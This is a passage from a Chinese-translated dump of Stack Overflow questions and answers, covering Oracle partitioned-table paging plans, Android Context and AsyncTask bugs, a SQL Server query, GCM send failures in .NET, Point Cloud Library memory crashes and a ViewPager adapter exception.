   3 - filter(ROWNUM<=40)
   5 - filter(ROWNUM<=40)
   6 - filter("ID">=376894993815568384)
   7 - access("TS"<TO_TIMESTAMP(:2))
       filter(INTERNAL_FUNCTION("TS")+0>=:1 AND "TS"<TO_TIMESTAMP(:2)) 
```

`+ 0`我们必须在我们的自定义 ORM 框架中实现上述特定于 Oracle 的解决方法和分区消除边界硬编码。它允许在切换到具有本地索引的分区表后保持相同的快速分页性能。

但我希望那些冒险在没有完全控制 sql 构建代码的情况下进行相同切换的人保持耐心和理智。

[当分区和分页](https://stackoverflow.com/questions/241622/paging-with-oracle)混合在一起时，Oracle 似乎有太多的陷阱。例如，我们发现 Oracle 12 的新`OFFSET ROWS / FETCH NEXT ROWS ONLY` [语法糖](https://oracle-base.com/articles/12c/row-limiting-clause-for-top-n-queries-12cr1)几乎不能用于本地索引分区表，因为它所基于的大多数[分析窗口函数。](https://use-the-index-luke.com/sql/partial-results/window-functions)

获取第一个页面后面的一些页面的最短工作查询是

```
select * from (select * from (
    select /*+ FIRST_ROWS(200) INDEX_RS_DESC(FR_MESSAGE_PART (TS)) */* from FR_MESSAGE_PART
where TS + 0 >= :1 and TS < :2
  and ID >= 376894993815568384 and ID < 411234940974268416
order by TS DESC) where ROWNUM <= 200) offset 180 rows; 
```

以下是运行此类查询后的[实际执行计划](https://stackoverflow.com/questions/4376329/jdbc-oracle-fetch-explain-plan-for-query/49927499#49927499)示例：

```
SQL_ID  c67mmq4wg49sx, child number 0
-------------------------------------
select * from (select * from (select /*+ FIRST_ROWS(200)
INDEX_RS_DESC("FR_MESSAGE_PART" ("TS")) GATHER_PLAN_STATISTICS */ "ID",
"MESSAGE_TYPE_ID", "TS", "REMOTE_ADDRESS", "TRX_ID",
"PROTOCOL_MESSAGE_ID", "MESSAGE_DATA_ID", "TEXT_OFFSET", "TEXT_SIZE",
"BODY_OFFSET", "BODY_SIZE", "INCOMING" from "FR_MESSAGE_PART" where
"TS" + 0 >= :1 and "TS" < :2 and "ID" >= 376894993815568384 and "ID" <
411234940974268416 order by "TS" DESC) where ROWNUM <= 200) offset 180
rows

Plan hash value: 2499404919

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
| Id  | Operation                                 | Name                  | Starts | E-Rows |E-Bytes|E-Temp | Cost (%CPU)| E-Time   | Pstart| Pstop | A-Rows |   A-Time   | Buffers |  OMem |  1Mem | Used-Mem |
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT                          |                       |      1 |        |       |       |   640K(100)|          |       |       |     20 |00:00:00.01 |     322 |       |       |          |
|*  1 |  VIEW                                     |                       |      1 |    200 |   130K|       |   640K  (1)| 00:00:26 |       |       |     20 |00:00:00.01 |     322 |       |       |          |
|   2 |   WINDOW NOSORT                           |                       |      1 |    200 |   127K|       |   640K  (1)| 00:00:26 |       |       |    200 |00:00:00.01 |     322 |   142K|   142K|          |
|   3 |    VIEW                                   |                       |      1 |    200 |   127K|       |   640K  (1)| 00:00:26 |       |       |    200 |00:00:00.01 |     322 |       |       |          |
|*  4 |     COUNT STOPKEY                         |                       |      1 |        |       |       |            |          |       |       |    200 |00:00:00.01 |     322 |       |       |          |
|   5 |      VIEW                                 |                       |      1 |    780K|   487M|       |   640K  (1)| 00:00:26 |       |       |    200 |00:00:00.01 |     322 |       |       |          |
|*  6 |       SORT ORDER BY STOPKEY               |                       |      1 |    780K|    68M|    89M|   640K  (1)| 00:00:26 |       |       |    200 |00:00:00.01 |     322 | 29696 | 29696 |26624  (0)|
|   7 |        PARTITION RANGE ITERATOR           |                       |      1 |    780K|    68M|       |   624K  (1)| 00:00:25 |     3 |     2 |    400 |00:00:00.01 |     322 |       |       |          |
|*  8 |         COUNT STOPKEY                     |                       |      2 |        |       |       |            |          |       |       |    400 |00:00:00.01 |     322 |       |       |          |
|*  9 |          TABLE ACCESS BY LOCAL INDEX ROWID| FR_MESSAGE_PART       |      2 |    780K|    68M|       |   624K  (1)| 00:00:25 |     3 |     2 |    400 |00:00:00.01 |     322 |       |       |          |
|* 10 |           INDEX RANGE SCAN DESCENDING     | IX_FR_MESSAGE_PART_TS |      2 |    559K|       |       | 44368   (1)| 00:00:02 |     3 |     2 |    400 |00:00:00.01 |       8 |       |       |          |
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Outline Data
-------------

  /*+
      BEGIN_OUTLINE_DATA
      IGNORE_OPTIM_EMBEDDED_HINTS
      OPTIMIZER_FEATURES_ENABLE('12.1.0.2')
      DB_VERSION('12.1.0.2')
      OPT_PARAM('optimizer_dynamic_sampling' 0)
      OPT_PARAM('_optimizer_dsdir_usage_control' 0)
      FIRST_ROWS(200)
      OUTLINE_LEAF(@"SEL$3")
      OUTLINE_LEAF(@"SEL$2")
      OUTLINE_LEAF(@"SEL$1")
      OUTLINE_LEAF(@"SEL$4")
      NO_ACCESS(@"SEL$4" "from$_subquery$_004"@"SEL$4")
      NO_ACCESS(@"SEL$1" "from$_subquery$_001"@"SEL$1")
      NO_ACCESS(@"SEL$2" "from$_subquery$_002"@"SEL$2")
      INDEX_RS_DESC(@"SEL$3" "FR_MESSAGE_PART"@"SEL$3" ("FR_MESSAGE_PART"."TS"))
      END_OUTLINE_DATA
  */

Predicate Information (identified by operation id):
---------------------------------------------------

   1 - filter("from$_subquery$_004"."rowlimit_$$_rownumber">180)
   4 - filter(ROWNUM<=200)
   6 - filter(ROWNUM<=200)
   8 - filter(ROWNUM<=200)
   9 - filter("ID">=376894993815568384)
  10 - access("TS"<:2)
       filter((INTERNAL_FUNCTION("TS")+0>=:1 AND "TS"<:2)) 
```

请注意实际获取的行和时间比优化器估计要好多少。

* * *

***更新***

请注意，即使这个最佳计划也可能会失败，从而降低本地索引全扫描速度，以防分区消除下限被猜测得太低，以至于最低分区不包含足够的记录来匹配查询过滤器。

rleishman 的[调优“BETWEEN”查询](http://www.orafaq.com/node/1798)指出：

> 问题是索引只能扫描具有范围谓词（<、>、LIKE、BETWEEN）的一列。所以即使一个索引同时包含lower_bound 和upper_bound 列，索引扫描也会返回所有匹配lower_bound <= :b 的行，然后过滤不匹配upper_bound >= :b 的行。
> 
> 在寻找的值位于中间某处的情况下，范围扫描将返回表中的一半行以找到单行。在最常见的搜索行位于顶部（最高值）的最坏情况下，索引扫描将在每次查找时处理表中的几乎每一行。

这意味着，不幸的是，Oracle 在达到 STOPKEY COUNT 条件或扫描整个分区之前不会考虑范围扫描过滤器的下限！

因此，我们必须将下分区消除边界启发式限制在时间戳下限所在的同一个月。这以不显示列表中的一些延迟事务消息的风险为代价来防御全索引扫描。但是，如果需要，可以通过延长提供的时间段来轻松解决这个问题。

* * *

我还尝试应用相同的`+ 0`技巧来强制具有动态分区消除边界绑定的最佳计划：

```
select * from (select /*+ FIRST_ROWS(40) INDEX_RS_DESC(FR_MESSAGE_PART (TS)) */ * from FR_MESSAGE_PART
where TS+0 >= :1 and TS < :2
  and ID >= :3 and ID+0 < :4
order by TS DESC) where ROWNUM <= 40; 
```

然后，该计划仍然保留`STOPKEY COUNT`每个分区的正确性，但分区消除丢失了上限，正如`Pstart`计划表的列所注意到的那样：

```
----------------------------------------------------------------------------------------------------------------------------------------
| Id  | Operation                                      | Name                  | Rows  | Bytes | Cost (%CPU)| Time     | Pstart| Pstop |
----------------------------------------------------------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT                               |                       |    40 | 26200 |  9083   (1)| 00:00:01 |       |       |
|*  1 |  COUNT STOPKEY                                 |                       |       |       |            |          |       |       |
|   2 |   VIEW                                         |                       |   153 |    97K|  9083   (1)| 00:00:01 |       |       |
|*  3 |    SORT ORDER BY STOPKEY                       |                       |   153 | 14076 |  9083   (1)| 00:00:01 |       |       |
|   4 |     PARTITION RANGE ITERATOR                   |                       |   153 | 14076 |  9082   (1)| 00:00:01 |    10 |   KEY |
|*  5 |      COUNT STOPKEY                             |                       |       |       |            |          |       |       |
|*  6 |       TABLE ACCESS BY LOCAL INDEX ROWID BATCHED| FR_MESSAGE_PART       |   153 | 14076 |  9082   (1)| 00:00:01 |    10 |   KEY |
|*  7 |        INDEX RANGE SCAN DESCENDING             | IX_FR_MESSAGE_PART_TS | 11023 |       |   891   (1)| 00:00:01 |    10 |   KEY |
----------------------------------------------------------------------------------------------------------------------------------------

Predicate Information (identified by operation id):
---------------------------------------------------

   1 - filter(ROWNUM<=40)
   3 - filter(ROWNUM<=40)
   5 - filter(ROWNUM<=40)
   6 - filter("ID">=TO_NUMBER(:3) AND "ID"+0<TO_NUMBER(:4))
   7 - access("TS"<TO_TIMESTAMP(:2))
       filter(INTERNAL_FUNCTION("TS")+0>=:1 AND "TS"<TO_TIMESTAMP(:2)) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-18T16:43:11.230

动态 SQL 是一种选择吗？这样您就可以“注入” TRX_ID 和 CREATE_TS 过滤器值，从而消除绑定变量的使用。也许然后生成的计划将包括 COUNT STOPKEY。

通过动态 SQL，我的意思是让您动态构造 SQL，然后使用 EXECUTE IMMEDIATE 或 OPEN 调用它。通过使用它，您可以直接使用过滤器而无需绑定变量。例子：

```
 v_sql VARCHAR2(1000) :=
    'select rd from (
        select /*+ INDEX(OUT_SMS OUT_SMS_CREATE_TS_TRX_ID_IX) */ rowid rd
        from OUT_SMS     
        where  TRX_ID between ' || v_trx_id_min || ' and ' || v_trx_id_maxb || '      
           and CREATE_TS between ' || v_create_ts_min|| ' and ' || v_create_ts_max || '
        order by CREATE_TS DESC, TRX_ID DESC
    ) where rownum <= 20'; 
```

然后使用以下命令调用它：

```
 EXECUTE IMMEDIATE v_sql; 
```

甚至：

```
 OPEN cursor_out FOR v_sql; 
```**

# android - 以下代码中的 java.lang.NullPointerException？

> ID：15357572
> 
> 赞同：0
> 
> 时间：2013-03-12T09:32:34.950
> 
> 标签：android

我有两个 java 类，其中一个是活动类，现在来自该活动类我想调用第二类的函数，它不是活动类。但是当我在 Font 类中调用函数 GetRobotoRegularFont 时，它向我显示一个错误，“由：

```
java.lang.NullPointerException
at com.ojaswi.font.Font.GetRobotoRegularFont(Font.java:16)
at com.ojaswi.bookingscapemob.LoginActivity.onCreate(LoginActivity.java:29) 
```

“..两个java文件的代码是..请任何人帮我回答..

第一个 Java 文件的代码

```
public class LoginActivity extends Activity {

EditText email;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.login);
    email = (EditText)findViewById(R.id.edtTextUname);
    email.setTypeface(new Font().GetRobotoRegularFont());

} 
```

}

第二个 Java 文件的代码

```
public class Font {

Typeface tf;
Context myContext;
public final Typeface GetRobotoRegularFont() {
    String fontPath = "fonts/Roboto-Regular.ttf";
    tf = Typeface.createFromAsset(myContext.getAssets(), fontPath);
    return tf;
} 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:36:30.857

您永远不会在 Font 类中设置 Context。

选项：

*   向构造函数添加上下文
*   为上下文字段添加 setter 方法
*   如果您不在其他地方使用 Font 类，您可以像 Raghunandan 提出的那样内联代码

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T10:27:06.653

在 LoginActivity 中这样写

```
email.setTypeface(new Font().GetRobotoRegularFont(this)); 
```

然后在字体类

```
public class Font {

Typeface tf;
Context myContext;
public final Typeface GetRobotoRegularFont(Context context) {
    myContext = context;
    String fontPath = "fonts/Roboto-Regular.ttf";
    tf = Typeface.createFromAsset(myContext.getAssets(), fontPath);
    return tf;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:36:34.023

假设该文件位于 assets 文件夹中，您可以执行以下操作。

```
 Typeface tf = Typeface.createFromAsset(getAssets(),"fonts/verdana.ttf");
 email = (EditText)findViewById(R.id.edtTextUname);
 email.setTypeface(tf,Typeface.BOLD); 
```

# android - AsyncTask 进度轮不旋转？

> ID：15357574
> 
> 赞同：0
> 
> 时间：2013-03-12T09:32:44.740
> 
> 标签：android, android-asynctask, progressdialog, swipe

当我执行**zip**、**unzip**、**下载文件**并将**数据从 XML 存储到数据库**时，AsyncTask 工作正常。

但是现在我正在尝试在布局中实现[https://github.com/fry15/uk.co.jasonfry.android.tools](https://github.com/fry15/uk.co.jasonfry.android.tools)滑动（从数据库中选择数据并在 webview 中显示），它会在运行时添加布局，因此需要很长一段时间，所以我可以把它放在 AsyncTask 但现在 AsyncTask 进度轮没有旋转？

我的代码工作正常，但问题不是 AsyncTask 上的旋转轮。

```
public class LoadSlideAndQuestion extends AsyncTask<Void, Void, Void> {

    ProgressDialog pDialog;

    protected void onPreExecute() {
        pDialog = new ProgressDialog(DialogBoxOnClick.this);
        pDialog.setMessage("Loading Slide and Questions...");
        pDialog.setCancelable(false);
        pDialog.show();

    }

    protected Void doInBackground(Void... unused) {

        Intent i = new Intent(DialogBoxOnClick.this, SlideScreen.class);
        startActivity(i);
        finish();
        return (null);
    }

    @Override
    protected void onProgressUpdate(Void... values) {
        // TODO Auto-generated method stub
        super.onProgressUpdate(values);
    }

    protected void onPostExecute(Void unused) {
        pDialog.dismiss();
    }

} 
```

**幻灯片活动**

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    setContentView(R.layout.temp);
    Display display = getWindowManager().getDefaultDisplay();
    width = display.getWidth();
    topic = getIntent().getSerializableExtra("name").toString();
    fetchdata();

    PageControl mPageControl = (PageControl) findViewById(R.id.page_control);
    mSwipeView = (SwipeView) findViewById(R.id.swipe_view);

    mSwipeView.setPageControl(mPageControl);

    for (int i = 0; i < max; i++) {
        mSwipeView.addView(new FrameLayout(this));
    }

    for (int i = 0; i < max; i++) {

        ((FrameLayout) mSwipeView.getChildContainer().getChildAt(i))
                .addView(setupView());
        count++;
    }
} 
```

**setupView() 函数返回视图**

```
 public View setupView() {

    LayoutInflater layoutInflator = getLayoutInflater();
    LinearLayout childlayout = (LinearLayout) layoutInflator.inflate(
            R.layout.webview, Switcher, false);

    question_number = (TextView) childlayout
            .findViewById(R.id.question_number);
    question_type = (TextView) childlayout.findViewById(R.id.question_type);
    question_parameters = (TextView) childlayout
            .findViewById(R.id.question_parameter);
    question_correct_answer = (TextView) childlayout
            .findViewById(R.id.question_correct_answer);
    question_difficulty = (TextView) childlayout
            .findViewById(R.id.question_difficulty);
    newObject = new Questionclass();
    newObject = XmlHandler.questionlist.get(count);
    System.out.println(newObject.QUESTION_NUMBER + "   NEW OBJECT");

    questionView = (WebView) childlayout.findViewById(R.id.Que_View);
    WebSettings webSettings = questionView.getSettings();
    // webSettings.setTextSize(WebSettings.TextSize.NORMAL);
    webSettings.setDefaultFontSize(23);

    question_number.setText(newObject.QUESTION_NUMBER);
    question_type.setText(newObject.QUESTION_TYPE);
    question_correct_answer.setText(newObject.QUESTION_CORRECT_ANSWER);
    question_parameters.setText(newObject.QUESTION_PARAMETERS);
    question_difficulty.setText(newObject.QUESTION_DIFFICULTY);

    questionView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);

    questionView.getSettings().setRenderPriority(RenderPriority.HIGH);
    questionView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);

    questionView.clearView();
    questionView.loadDataWithBaseURL(
            "",
            IntegralParse.htmlParse(newObject.QUESTION_CODE,
                    "/mnt/sdcard/CHECK_LESSON_QUESTIONS/" + topic + "/" + topic
                            + "/" + newObject.QUESTION_NUMBER,
                    getApplicationContext(), width)
                    + "<hr/>"
                    + IntegralParse.htmlParse(newObject.QUESTION_SOL_CODE,
                            "/mnt/sdcard/CHECK_LESSON_QUESTIONS/" + topic + "/"
                                    + topic + "/"
                                    + newObject.QUESTION_NUMBER,
                            getApplicationContext(), width), "text/html",
            "utf-8", "");
    questionView.requestLayout();
    return childlayout;

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:44:16.753

您是否尝试在 UI 线程之外操作 UI？您需要使用 a[`Handler`](https://developer.android.com/reference/android/os/Handler.html)对任务进行排队，以便从后台线程在 UI 线程上执行。

[有关与 UI 线程通信的](https://developer.android.com/training/multiple-threads/communicate-ui.html)更多信息。

# java - 选择哪里.... ms sql 2005 中需要电气状态

> ID：15357576
> 
> 赞同：1
> 
> 时间：2013-03-12T09:32:51.590
> 
> 标签：java, sql, sql-server, tsql

我有一个数据库表规划表如下

```
SONo.         LineNo.         ElectricalStatus  
1              10              Required  
1              20              Required  
2              10              NotRequired  
2              20              Required  
2              30              Required  
3              10              NotRequired  
4              10              NotRequired 
```

我想在 SONo. 旁边显示所有记录 +，比如是否需要电气状态。

例如，

```
SONo.         ElectricalStatus  
1             Required  
2             Required 
```

因为 SONo。3 和 4 没有按要求的电气状态和 SONo 的记录。2 具有所需电气状态的记录

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:34:50.017

你可以简单地这样做：

```
SELECT DISTINCT SONO,  ElectricalStatus
FROM tablename
WHERE  ElectricalStatus = 'Required'; 
```

[**SQL 小提琴演示**](http://www.sqlfiddle.com/#!3/1d3eb/1)

这会给你：

```
| SONO | ELECTRICALSTATUS |
---------------------------
|    1 |         Required |
|    2 |         Required | 
```

# android - 发送 GCM 消息（服务器端）经常失败 - 但远非总是

> ID：15357577
> 
> 赞同：9
> 
> 时间：2013-03-12T09:32:53.447
> 
> 标签：android, .net, http, google-cloud-messaging

我正在为我的 Android 应用程序使用 Google Cloud Messaging (GCM) 服务。我已经按照所有规则实施了它，并且它有效。嗯，差不多。

大多数情况下，我会说在 60-70% 的情况下，我可以使用 google 网页上讨论的 web 服务从我的服务器成功发送 GCM 消息。

正常情况下，我从 webservice 收到以下回复，这表明我成功发送了 GCM 消息：

```
{
    "multicast_id":8378088572050307085,
    "success":1,
    "failure":0,
    "canonical_ids":0,
    "results":
    [
        {
            "message_id":"0:1363080282442710%7c4250c100000031"
        }
    ]
} 
```

这就是说：一切正常，消息已发送。

但是，在许多情况下，我在调用 Web 服务时会收到 HTTP 错误，上面写着：

> 无法从传输连接读取数据：已建立的连接被主机中的软件中止。

这是 .NET 消息，告诉我调用 Web 服务（使用 HttpWebRequest 和 POST）失败。

这是一些显示问题的日志消息：

![在此处输入图像描述](../Images/ece1bdf9d205b572f764fae2fb9a17c8.png)

这是我用来调用 WS 的代码：

```
public static string SendMessage(string registrationId, string command, string extra, bool retry)
{
    try
    {
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://android.googleapis.com/gcm/send");
        request.Method = PostWebRequest;
        request.KeepAlive = false;

        GCMPostPacket json = new GCMPostPacket()
        {
            collapse_key = "1",
            time_to_live = 60,
            registration_ids = new List<string>(new string[] { registrationId }),
            data = new GcmData()
            {
                message = command,
                misc = extra
            }
        };
        // Converting to JSON string
        string jsonString = SICJsonProtocol.JSONHelper.Serialize<GCMPostPacket>(json);
        byte[] byteArray = Encoding.UTF8.GetBytes(jsonString);

        request.ContentType = "application/json";
        request.ContentLength = byteArray.Length;
        request.ProtocolVersion = HttpVersion.Version10;

        request.Headers.Add(HttpRequestHeader.Authorization, "key=" + "MyVerySecretKey");

        Stream dataStream = request.GetRequestStream();
        dataStream.Write(byteArray, 0, byteArray.Length);
        dataStream.Close();

        using (WebResponse response = request.GetResponse())
        {
            HttpStatusCode responseCode = ((HttpWebResponse)response).StatusCode;
            if (responseCode.Equals(HttpStatusCode.Unauthorized) || responseCode.Equals(HttpStatusCode.Forbidden))
            {
                Console.WriteLine("Unauthorized - need new token");
            }
            else if (!responseCode.Equals(HttpStatusCode.OK))
            {
                Console.WriteLine("Response from web service not OK :");
                Console.WriteLine(((HttpWebResponse)response).StatusDescription);
            }

            StreamReader reader = new StreamReader(response.GetResponseStream());
            string responseLine = reader.ReadLine();
            Console.WriteLine("************************");
            Console.WriteLine("GCM send: " + responseCode + " | " + responseLine);
            // This is the log shown in the image above
            SRef.main.gui.ServiceUpdate("GCM send: " + responseCode + " | " + responseLine);
            reader.Close();
            response.Close();
            return responseLine;
        }

    }
    catch (Exception e)
    {
        // This is the log shown in the image above
        SRef.main.gui.ServiceUpdate("Failed send GCM, " + (retry ? "retrying in 20 sec" : "not retrying") + ". Error=" + e.Message);
        if (retry)
        {
            System.Threading.ThreadPool.QueueUserWorkItem(delegate(object obj)
            {
                try
                {
                    System.Threading.Thread.Sleep(20000);
                    SendMessage(registrationId, command, extra, false);
                }
                catch (Exception ex)
                {
                }
            });
        }
        return null;
    }
} 
```

任何人都可以看到我是否做错了什么，或者我是否缺少一般的东西？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T19:11:29.033

> 无法从传输连接读取数据：已建立的连接被主机中的软件中止。

此错误与 GCM API 无关。这意味着您的客户端尝试联系 Web 服务，但已建立的连接在其中一个网络层中被切断。根据您收到此错误的位置和错误消息，它可能意味着几件事。

1.  由于套接字超时，您的客户端决定中止连接。增加客户端读取/套接字超时以改善这种情况。

2.  位于客户端和服务器之间的负载平衡器断开了连接。每一方都认为另一方断开了连接。

网络超时通常是一个巨大的痛苦，因为永远不清楚连接在哪里断开以及是谁断开了它。如果增加超时没有帮助，我建议通过可以嗅探 HTTPS 流量（charles / TCPMON）的代理发送请求，或者使用 Wireshark 查看哪些数据包被丢弃。

您的 android 应用程序还具有 GCM 监控，您可以在“统计”选项卡上启用它。检查 GCM API 是否在该图表上报告除了 200 OK 之外的状态消息。这将有助于进一步缩小问题范围。如果没有报告除了 200 之外的状态码，这意味着 GCM 从未收到您的 API 请求。

# memory-management - 看似随机的使用点云库处理点云崩溃 - 可能是内存问题？

> ID：15357578
> 
> 赞同：1
> 
> 时间：2013-03-12T09:32:57.287
> 
> 标签：memory-management, crash, point-cloud-library

我正在对点云进行几个重投影步骤（最初大约 4000 万个点，处理时大约 2000 万个点）。程序在这两个循环之一的看似随机的点崩溃。如果我使用较小的子集（约 1000 万点）运行它，一切正常。

```
//Projection of Point Cloud into a sphere 
pcl::PointCloud<pcl::PointXYZ>::Ptr projSphere(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud,int radius) 
        { 
        //output cloud 
        pcl::PointCloud<pcl::PointXYZ>::Ptr output(new pcl::PointCloud<pcl::PointXYZ>); 
        //time marker 
        int startTime = time(NULL); 
        cout<<"Start Sphere Projection"<<endl; 
        //factor by which each Point Vector ist multiplied to get a distance of radius to the origin 
        float scalar; 
        for (int i=0;i<cloud->size();i++) 
                { 
                if (i%1000000==0) cout<<i<<endl; 
                //P 
                pcl::PointXYZ tmpin=cloud->points.at(i); 
                //P' 
                pcl::PointXYZ tmpout; 
                scalar=radius/(sqrt(pow(tmpin.x,2)+pow(tmpin.y,2)+pow(tmpin.z,2))); 
                tmpout.x=tmpin.x*scalar; 
                tmpout.y=tmpin.y*scalar; 
                tmpout.z=tmpin.z*scalar; 
                //Adding P' to the output cloud 
                output->push_back(tmpout); 
                } 
        cout<<"Finished projection of "<<output->size()<<" points in "<<time(NULL)-startTime<<" seconds"<<endl; 
        return(output); 
        } 
//Stereographic Projection 
pcl::PointCloud<pcl::PointXYZ>::Ptr projStereo(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) 
        { 
        //output cloud 
        pcl::PointCloud<pcl::PointXYZ>::Ptr outputSt(new pcl::PointCloud<pcl::PointXYZ>); 
        //time marker 
        int startTime = time(NULL); 
        cout<<"Start Stereographic Projection"<<endl; 
        for (int i=0;i<cloud->size();i++) 
                { 
                //P 
                if (i%1000000==0) cout<<i<<endl; 
                pcl::PointXYZ tmpin=cloud->points.at(i); 
                //P' 
                pcl::PointXYZ tmpout; 
                //equation 
                tmpout.x=tmpin.x/(1.0+tmpin.z); 
                tmpout.y=tmpin.y/(1.0+tmpin.z); 
                tmpout.z=0; 
                //Adding P' to the output cloud 
                outputSt->push_back(tmpout); 
                } 
        cout<<"Finished projection of"<<outputSt->size()<<" points in "<<time(NULL)-startTime<<" seconds"<<endl; 
        return(outputSt); 
        } 
```

如果我通过在硬盘上保存/加载点云并为每个步骤重新运行程序来独立完成所有步骤，它也可以正常工作。我想提供整个源文件，但我不确定如何/是否需要。提前致谢

编辑：1 大约一周后，我仍然不知道这里可能是什么问题，因为崩溃有点随机，但不是真的？我尝试使用不同的系统工作负载（新重新启动，加载重型程序等）测试程序并没有明显的区别。因为我认为这可能是内存问题，所以我尝试将大对象从堆栈移动到堆（用 new 初始化它们），也没有任何区别。到目前为止，最大的对象是原始输入文件，我打开和关闭它：

```
 ifstream file;
    file.open(infile);
/*......*/
    file.close();
    delete file; 
```

这样做是否正确，以便在方法完成后释放内存？

再次编辑：所以我越来越尝试，最后我设法将所有步骤放入一个函数中，如下所示：

```
void stereoTiffI(string infile, string outfile, int length)
    {
    //set up file input
    cout<<"Opening file: "<< infile<<endl;
    ifstream file;
    file.open(infile);
    string line;
    //skip first lines
    for (int i=0;i<9;i++)
        {
        getline(file,line);
        }
    //output cloud
    pcl::PointCloud<pcl::PointXYZ> cloud;
    getline(file,line);
    //indexes for string parsing, coordinates and starting Timer
    int i=0;
    int j=0;
    int k=0;
    float x=0;
    float y=0;
    float z=0;
    float intensity=0;
    float scalar=0;
    int startTime = time(NULL);
    pcl::PointXYZ tmp;
    //begin loop
    cout<<"Begin reading and projecting"<< infile<<endl;
    while (!file.eof())
        {

        getline(file,line);
        i=0;
        j=line.find(" ");
        x=atof(line.substr(i,j).c_str());
        i=line.find(" ",i)+1;
        j=line.find(" ",i)-i;
        y=atof(line.substr(i,j).c_str());
        i=line.find(" ",i)+1;
        j=line.find(" ",i)-i;
        z=atof(line.substr(i,j).c_str());
        //i=line.find(" ",i)+1;
        //j=line.find(" ",i)-i;
        //intensity=atof(line.substr(i,j).c_str());
        //leave out points below scanner height
        if (z>0)
            {
            //projection to a hemisphere with radius 1
            scalar=1/(sqrt(pow(x,2)+pow(y,2)+pow(z,2)));
            x=x*scalar;
            y=y*scalar;
            z=z*scalar;
            //stereographic projection
            x=x/(1.0+z);
            y=y/(1.0+z);
            z=0;
            tmp.x=x;
            tmp.y=y;
            tmp.z=z;
            //tmp.intensity=intensity;
            cloud.push_back(tmp);
            k++;
            if (k%1000000==0)cout<<k<<endl;
            }
        }
    cout<<"Finished producing projected cloud in: "<<time(NULL)-startTime<<" with "<<cloud.size()<<" points."<<endl; 
```

这实际上可以很好地快速退出。在下一步中，我尝试使用 Pointtype XYZI，因为我还需要获取扫描点的强度。你猜怎么着，程序在 17000000 左右再次崩溃，我也不知道为什么。请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T18:35:15.400

好的，我解决了。内存博士通过给我一个堆分配错误给了我正确的提示。经过一番谷歌搜索后，我在 Visual Studio 中启用了大地址（属性 -> 链接器 -> 系统），一切都像一个魅力。

# android - 屏幕方向更改后从 ViewPager 的适配器中销毁项目

> ID：15357581
> 
> 赞同：25
> 
> 时间：2013-03-12T09:33:01.640
> 
> 标签：android, android-viewpager, android-pageradapter, fragmentstatepageradapter

`ViewPager`因此，在屏幕方向更改后，我在销毁（删除）一页时遇到了问题。我将尝试在以下几行中描述问题。

我正在使用 的`FragmentStatePagerAdapter`适配器`ViewPager`和一个描述无限视图寻呼机应该如何工作的小界面。它背后的想法是您可以向右滚动直到到达`ViewPager`. 如果您可以从 API 调用加载更多结果，则会显示一个进度页面，直到结果出现。

到目前为止一切都很好，现在问题来了。如果在这个加载过程中，我旋转屏幕（这不会影响 API 调用，它基本上是一个`AsyncTask`），当调用返回时，应用程序崩溃给我这个异常：

```
E/AndroidRuntime(13471): java.lang.IllegalStateException: Fragment ProgressFragment{42b08548} is not currently in the FragmentManager
E/AndroidRuntime(13471):    at android.support.v4.app.FragmentManagerImpl.saveFragmentInstanceState(FragmentManager.java:573)
E/AndroidRuntime(13471):    at android.support.v4.app.FragmentStatePagerAdapter.destroyItem(FragmentStatePagerAdapter.java:136)
E/AndroidRuntime(13471):    at mypackage.OutterFragment$PagedSingleDataAdapter.destroyItem(OutterFragment.java:609) 
```

在对库的代码进行了一些挖掘之后，似乎`mIndex`片段的数据字段比`0`这种情况下要少，这会引发该异常。

这是寻呼机适配器的代码：

```
static class PagedSingleDataAdapter extends FragmentStatePagerAdapter implements
        IEndlessPagerAdapter {

    private WeakReference<OutterFragment> fragment;
    private List<DataItem> data;
    private SparseArray<WeakReference<Fragment>> currentFragments = new SparseArray<WeakReference<Fragment>>();

    private ProgressFragment progressElement;

    private boolean isLoadingData;

    public PagedSingleDataAdapter(SherlockFragment fragment, List<DataItem> data) {
        super(fragment.getChildFragmentManager());
        this.fragment = new WeakReference<OutterFragment>(
                (OutterFragment) fragment);
        this.data = data;
    }

    @Override
    public Object instantiateItem(ViewGroup container, int position) {
        Object item = super.instantiateItem(container, position);
        currentFragments.append(position, new WeakReference<Fragment>(
                (Fragment) item));
        return item;
    }

    @Override
    public void destroyItem(ViewGroup container, int position, Object object) {
        currentFragments.put(position, null);
        super.destroyItem(container, position, object);
    }

    @Override
    public Fragment getItem(int position) {
        if (isPositionOfProgressElement(position)) {
            return getProgessElement();
        }

        WeakReference<Fragment> fragmentRef = currentFragments.get(position);
        if (fragmentRef == null) {
            return PageFragment.newInstance(args); // here I'm putting some info
                                                // in the args, just deleted
                                                // them now, not important
        }

        return fragmentRef.get();
    }

    @Override
    public int getCount() {
        int size = data.size();
        return isLoadingData ? ++size : size;
    }

    @Override
    public int getItemPosition(Object item) {
        if (item.equals(progressElement) && !isLoadingData) {
            return PagerAdapter.POSITION_NONE;
        }
        return PagerAdapter.POSITION_UNCHANGED;
    }

    public void setData(List<DataItem> data) {
        this.data = data;
        notifyDataSetChanged();
    }

    @Override
    public boolean isPositionOfProgressElement(int position) {
        return isLoadingData && position == data.size();
    }

    @Override
    public void setLoadingData(boolean isLoadingData) {
